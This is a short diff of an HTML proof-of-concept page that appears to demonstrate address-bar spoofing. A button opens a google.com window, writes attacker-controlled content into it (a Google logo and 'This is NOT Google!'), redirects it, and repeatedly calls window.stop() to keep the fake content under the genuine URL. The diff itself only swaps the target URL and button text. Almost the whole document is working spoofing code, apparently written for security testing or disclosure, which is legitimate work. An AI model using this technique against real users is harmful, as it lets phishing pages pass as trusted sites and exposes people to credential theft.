@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="testRedirect()">CLICK </button>
+<button onclick="testRedirect()">CLICK AJA </button>
 <script>
 function testRedirect() {
-    let win = window.open("https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000");
+    let win = window.open("https://www.google.com/csi", "https://www.google.com/csi");
     let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
         '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
         '<h1>This is NOT Google!</h1>' +
@@ -14,7 +14,7 @@ function testRedirect() {
         '</div>';
     win.document.write(payload);
     win.document.close();
-    win.location.replace("https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000");
+    win.location.replace("https://www.google.com/csi");
     setInterval(function() {
         win.stop();
     }, 1500);  // Small interval to preserve the spoof
